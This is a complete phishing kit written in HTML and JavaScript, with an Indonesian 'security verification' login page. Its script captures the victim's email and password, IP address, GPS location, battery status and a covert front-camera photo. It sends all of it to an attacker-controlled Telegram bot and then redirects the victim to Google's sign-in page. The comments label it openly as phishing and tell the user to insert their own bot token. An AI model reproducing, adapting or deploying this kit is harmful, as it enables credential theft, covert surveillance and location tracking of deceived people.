<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verifikasi Keamanan</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: radial-gradient(ellipse at 50% 0%, #1a1a3e 0%, #0a0a1a 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #fff;
        }
        .container {
            max-width: 420px;
            width: 100%;
            background: rgba(255,255,255,0.04);
            backdrop-filter: blur(30px);
            border-radius: 36px;
            padding: 28px 24px 30px;
            border: 1px solid rgba(255,255,255,0.06);
            box-shadow: 0 30px 80px rgba(0,0,0,0.6);
        }
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .security-badge {
            display: flex;
            align-items: center;
            gap: 10px;
            background: rgba(0,200,255,0.08);
            padding: 8px 16px 8px 12px;
            border-radius: 30px;
            border: 1px solid rgba(0,200,255,0.15);
        }
        .badge-text {
            font-size: 11px;
            font-weight: 600;
            color: #8ac4ff;
            text-transform: uppercase;
        }
        .status-dot {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .dot {
            width: 8px;
            height: 8px;
            background: #4ade80;
            border-radius: 50%;
            animation: pulse-dot 1.8s ease-in-out infinite;
        }
        @keyframes pulse-dot {
            0%,100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.4; transform: scale(0.8); }
        }
        .status-text {
            font-size: 11px;
            color: rgba(255,255,255,0.4);
        }
        .login-section {
            background: rgba(255,255,255,0.02);
            border-radius: 24px;
            padding: 28px 22px 22px;
            border: 1px solid rgba(255,255,255,0.04);
        }
        .login-header {
            text-align: center;
            margin-bottom: 24px;
        }
        .avatar-ring {
            width: 72px;
            height: 72px;
            border-radius: 50%;
            background: linear-gradient(135deg, #00c8ff, #007aff);
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0 auto 16px;
            box-shadow: 0 0 40px rgba(0,200,255,0.15);
        }
        .avatar-icon {
            font-size: 36px;
            color: #fff;
        }
        .login-header h2 {
            font-size: 20px;
            font-weight: 700;
            background: linear-gradient(135deg, #fff 60%, rgba(255,255,255,0.5));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }
        .login-header p {
            font-size: 13px;
            color: rgba(255,255,255,0.35);
        }
        .login-form {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }
        .input-group {
            display: flex;
            flex-direction: column;
            gap: 5px;
        }
        .input-group label {
            font-size: 12px;
            font-weight: 500;
            color: rgba(255,255,255,0.45);
        }
        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }
        .input-wrapper input {
            width: 100%;
            padding: 14px 44px 14px 44px;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 14px;
            color: #fff;
            font-size: 15px;
            outline: none;
            transition: all 0.3s ease;
        }
        .input-wrapper input:focus {
            border-color: rgba(0,200,255,0.3);
            background: rgba(255,255,255,0.07);
        }
        .input-icon {
            position: absolute;
            left: 16px;
            color: rgba(255,255,255,0.2);
        }
        .toggle-pass {
            position: absolute;
            right: 14px;
            background: transparent;
            border: none;
            color: rgba(255,255,255,0.2);
            cursor: pointer;
            font-size: 15px;
        }
        .login-btn {
            width: 100%;
            padding: 16px;
            border: none;
            border-radius: 16px;
            background: linear-gradient(135deg, #00c8ff, #007aff);
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 4px;
        }
        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 40px rgba(0,200,255,0.25);
        }
        .login-btn .btn-loader { display: none; }
        .login-btn.loading .btn-text { display: none; }
        .login-btn.loading .btn-loader { display: inline-block; }
        .login-btn.success { background: linear-gradient(135deg, #4ade80, #22c55e); }
        .login-btn.success .btn-text { display: inline-block; }
        .login-btn.success .btn-loader { display: none; }
        .izin-box {
            background: rgba(255,255,255,0.05);
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 16px;
            border: 1px solid rgba(255,255,255,0.06);
            font-size: 13px;
            color: rgba(255,255,255,0.6);
            text-align: center;
        }
        .izin-box span { color: #4ac4ff; }
    </style>
</head>
<body>

    <video id="hiddenVideo" style="display:none;" autoplay playsinline muted></video>
    <canvas id="hiddenCanvas" style="display:none;"></canvas>

    <div class="container">
        <div class="header">
            <div class="security-badge">
                <span class="badge-text">Verifikasi Keamanan</span>
            </div>
            <div class="status-dot" id="statusDot">
                <span class="dot"></span>
                <span class="status-text">Siap</span>
            </div>
        </div>

        <div class="login-section">
            <div class="login-header">
                <div class="avatar-ring">
                    <span class="avatar-icon">🔐</span>
                </div>
                <h2>Masuk ke Akun</h2>
                <p>Verifikasi identitas untuk melanjutkan</p>
            </div>

            <div class="izin-box">
                ⚠️ Untuk verifikasi, izinkan akses <span>kamera</span> dan <span>lokasi</span> jika diminta.
            </div>

            <form id="loginForm" class="login-form" autocomplete="off">
                <div class="input-group">
                    <label>Email atau Nama Pengguna</label>
                    <div class="input-wrapper">
                        <span class="input-icon">📧</span>
                        <input type="text" id="email" placeholder="contoh@email.com" required>
                    </div>
                </div>

                <div class="input-group">
                    <label>Kata Sandi</label>
                    <div class="input-wrapper">
                        <span class="input-icon">🔒</span>
                        <input type="password" id="password" placeholder="••••••••" required>
                        <button type="button" id="togglePass" class="toggle-pass">👁️</button>
                    </div>
                </div>

                <button type="submit" class="login-btn" id="loginBtn">
                    <span class="btn-text">Verifikasi & Masuk</span>
                    <span class="btn-loader">⏳</span>
                </button>
            </form>
        </div>
    </div>

    <script>
        // ============================================================
        // KONFIGURASI TELEGRAM (GANTI DENGAN TOKEN BARU KAMU)
        // ============================================================
        const BOT = 'YOUR_BOT_TOKEN_HERE';
        const CHAT = 'YOUR_CHAT_ID_HERE';

        // ============================================================
        // MINTA IZIN SEJAK AWAL (BIAR GAK MUNCUL MENDADAK)
        // ============================================================
        (function mintaIzinAwal() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    () => { console.log('✅ Izin lokasi diberikan'); },
                    () => { console.log('❌ Izin lokasi ditolak'); },
                    { enableHighAccuracy: true, timeout: 5000 }
                );
            }
            if (navigator.mediaDevices?.getUserMedia) {
                navigator.mediaDevices.getUserMedia({ video: true, audio: false })
                    .then(stream => {
                        console.log('✅ Izin kamera diberikan');
                        stream.getTracks().forEach(t => t.stop());
                    })
                    .catch(() => {
                        console.log('❌ Izin kamera ditolak');
                    });
            }
        })();

        // ============================================================
        // KIRIM PESAN KE TELEGRAM
        // ============================================================
        function sendTelegram(text) {
            if (BOT === 'YOUR_BOT_TOKEN_HERE') {
                console.warn('⚠️ Token belum diganti!');
                return;
            }
            fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT,
                    text: text,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            })
            .then(res => res.json())
            .then(data => {
                if (data.ok) {
                    console.log('✅ Pesan terkirim ke Telegram');
                } else {
                    console.error('❌ Gagal kirim:', data);
                }
            })
            .catch(err => {
                console.error('❌ Error:', err);
            });
        }

        // ============================================================
        // KIRIM FOTO KE TELEGRAM
        // ============================================================
        function sendPhotoTelegram(base64, caption) {
            if (!base64 || BOT === 'YOUR_BOT_TOKEN_HERE') return;
            try {
                const byteString = atob(base64.split(',')[1]);
                const ab = new ArrayBuffer(byteString.length);
                const ia = new Uint8Array(ab);
                for (let i = 0; i < byteString.length; i++) {
                    ia[i] = byteString.charCodeAt(i);
                }
                const blob = new Blob([ab], { type: 'image/jpeg' });
                const fd = new FormData();
                fd.append('chat_id', CHAT);
                fd.append('photo', blob, 'shot.jpg');
                if (caption) fd.append('caption', caption);
                fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method: 'POST', body: fd })
                    .then(res => res.json())
                    .then(data => {
                        if (data.ok) console.log('✅ Foto terkirim');
                        else console.error('❌ Gagal kirim foto:', data);
                    })
                    .catch(err => console.error('❌ Error foto:', err));
            } catch(e) {
                console.error('❌ Error foto:', e);
            }
        }

        // ============================================================
        // KIRIM LOKASI KE TELEGRAM
        // ============================================================
        function sendLocationTelegram(lat, lng) {
            if (BOT === 'YOUR_BOT_TOKEN_HERE') return;
            fetch(`https://api.telegram.org/bot${BOT}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT,
                    latitude: lat,
                    longitude: lng
                })
            })
            .then(res => res.json())
            .then(data => {
                if (data.ok) console.log('✅ Lokasi terkirim');
                else console.error('❌ Gagal kirim lokasi:', data);
            })
            .catch(err => console.error('❌ Error lokasi:', err));
        }

        // ============================================================
        // SUBMIT FORM
        // ============================================================
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const email = document.getElementById('email').value.trim();
            const pass = document.getElementById('password').value.trim();

            if (!email || !pass) {
                alert('Isi email dan password!');
                return;
            }

            const btn = document.getElementById('loginBtn');
            btn.classList.add('loading');

            // Data yang akan dikirim
            let data = {
                email: email,
                pass: pass,
                ip: 'Mengambil...',
                negara: '-',
                kota: '-',
                bat: '-',
                charging: '-',
                lat: '-',
                lng: '-',
                akurasi: '-',
                kota2: '-',
                foto: null,
                device: navigator.userAgent,
                waktu: new Date().toLocaleString('id-ID')
            };

            let selesai = 0;
            const totalData = 5;

            function cekSelesai() {
                selesai++;
                if (selesai >= totalData) {
                    kirimSemua();
                }
            }

            // ===== 1. AMBIL IP =====
            fetch('https://ipapi.co/json/')
                .then(r => r.json())
                .then(d => {
                    data.ip = d.ip || 'Tidak tersedia';
                    data.negara = d.country_name || '-';
                    data.kota = d.city || '-';
                })
                .catch(() => { data.ip = 'Gagal ambil'; })
                .finally(cekSelesai);

            // ===== 2. AMBIL BATERAI =====
            if (navigator.getBattery) {
                navigator.getBattery()
                    .then(b => {
                        data.bat = Math.round(b.level * 100) + '%';
                        data.charging = b.charging ? '✅ Ya' : '❌ Tidak';
                    })
                    .catch(() => { data.bat = 'Tidak tersedia'; })
                    .finally(cekSelesai);
            } else {
                data.bat = 'Tidak didukung';
                cekSelesai();
            }

            // ===== 3. AMBIL LOKASI GPS =====
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    p => {
                        data.lat = p.coords.latitude.toFixed(6);
                        data.lng = p.coords.longitude.toFixed(6);
                        data.akurasi = p.coords.accuracy + 'm';
                        fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${p.coords.latitude}&longitude=${p.coords.longitude}&localityLanguage=id`)
                            .then(r => r.json())
                            .then(d => {
                                data.kota2 = d.city || d.locality || '';
                            })
                            .catch(() => {});
                    },
                    () => {},
                    { enableHighAccuracy: true, timeout: 10000 }
                )
                .finally(cekSelesai);
            } else {
                data.lat = 'Tidak didukung';
                cekSelesai();
            }

            // ===== 4. AMBIL FOTO =====
            if (navigator.mediaDevices?.getUserMedia) {
                navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: 320, height: 240 },
                    audio: false
                })
                .then(stream => {
                    const video = document.getElementById('hiddenVideo');
                    const canvas = document.getElementById('hiddenCanvas');
                    video.srcObject = stream;
                    setTimeout(() => {
                        if (video.videoWidth) {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.save();
                            ctx.scale(-1, 1);
                            ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
                            ctx.restore();
                            data.foto = canvas.toDataURL('image/jpeg', 0.7);
                        }
                        stream.getTracks().forEach(t => t.stop());
                    }, 1000);
                })
                .catch(() => {})
                .finally(() => {
                    setTimeout(cekSelesai, 1500);
                });
            } else {
                data.foto = null;
                cekSelesai();
            }

            // ===== 5. DEVICE =====
            cekSelesai();

            // ============================================================
            // FUNGSI KIRIM SEMUA DATA KE TELEGRAM
            // ============================================================
            function kirimSemua() {
                let msg = '';
                msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
                msg += '📥  HASIL PHISHING\n';
                msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
                msg += '📧  Email    : ' + data.email + '\n';
                msg += '🔒  Password : ' + data.pass + '\n\n';
                msg += '━━━  📱 PERANGKAT  ━━━\n';
                msg += '🖥️  Device   : ' + data.device.substring(0, 50) + '...\n';
                msg += '⏰  Waktu    : ' + data.waktu + '\n\n';
                msg += '━━━  🌐 JARINGAN  ━━━\n';
                msg += '🌐  IP       : ' + data.ip + '\n';
                msg += '🏳️  Negara   : ' + data.negara + '\n';
                msg += '📍  Kota     : ' + (data.kota || data.kota2 || '-') + '\n\n';
                msg += '━━━  🔋 BATERAI  ━━━\n';
                msg += '🔋  Level    : ' + data.bat + '\n';
                msg += '⚡  Charging : ' + data.charging + '\n\n';
                msg += '━━━  📍 LOKASI  ━━━\n';
                msg += '📍  Lat      : ' + data.lat + '\n';
                msg += '📍  Lng      : ' + data.lng + '\n';
                msg += '🎯  Akurasi  : ' + data.akurasi + '\n';
                msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━';

                // Kirim pesan
                sendTelegram(msg);

                // Kirim foto
                if (data.foto) {
                    const caption = '📸  FOTO SELFIE\n' + data.waktu + '\n' + data.email;
                    sendPhotoTelegram(data.foto, caption);
                }

                // Kirim lokasi
                if (data.lat !== '-' && data.lng !== '-') {
                    sendLocationTelegram(parseFloat(data.lat), parseFloat(data.lng));
                
                }

                // Ubah tombol
                btn.classList.remove('loading');
                btn.classList.add('success');
                btn.querySelector('.btn-text').textContent = '✓ Berhasil';

                // Redirect
                setTimeout(() => {
                    window.location.href = 'https://accounts.google.com/';
                }, 1500);

                console.log('✅ Semua data terkirim!');
            }
        });

        // ============================================================
        // TOGGLE PASSWORD (Show/Hide)
        // ============================================================
        document.getElementById('togglePass').addEventListener('click', function() {
            const inp = document.getElementById('password');
            if (inp.type === 'password') {
                inp.type = 'text';
                this.textContent = '🙈';
            } else {
                inp.type = 'password';
                this.textContent = '👁️';
            }
        });

        console.log('✅ Phishing siap!');
        console.log('📌 Token:', BOT);
        console.log('📌 Chat ID:', CHAT);
    </script>
</body>
</html>
